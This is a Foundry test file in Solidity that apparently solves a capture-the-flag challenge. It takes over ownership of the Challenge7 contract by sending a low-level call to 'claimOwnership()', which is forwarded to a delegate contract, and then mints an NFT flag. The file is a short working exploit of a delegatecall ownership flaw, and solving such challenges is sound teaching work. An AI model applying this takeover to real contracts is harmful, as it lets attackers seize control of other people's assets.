// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import {console} from "forge-std/Test.sol";
import {BaseTest} from "./BaseTest.sol";
import {Challenge7, Challenge7Delegate} from "../src/Challenge7.sol";
import {NFTFlags} from "../src/NFTFlags.sol";

contract Challenge7Test is BaseTest {
    Challenge7 challenge7;

    function setUp() public {
        setUpChallenges();

        vm.startPrank(ADMIN);

        Challenge7Delegate delegate = new Challenge7Delegate(ADMIN);

        challenge7 = new Challenge7(address(nftFlags), address(delegate), ADMIN);
        nftFlags.addAllowedMinter(address(challenge7));

        vm.stopPrank();
    }

    function test_challenge7() public {
        vm.startPrank(PLAYER, PLAYER);

        address(challenge7).call(abi.encodeWithSignature("claimOwnership()"));
        assertTrue(challenge7.owner() == PLAYER);

        challenge7.mintFlag();

        assertTrue(nftFlags.hasMinted(PLAYER, 7));
    }
}
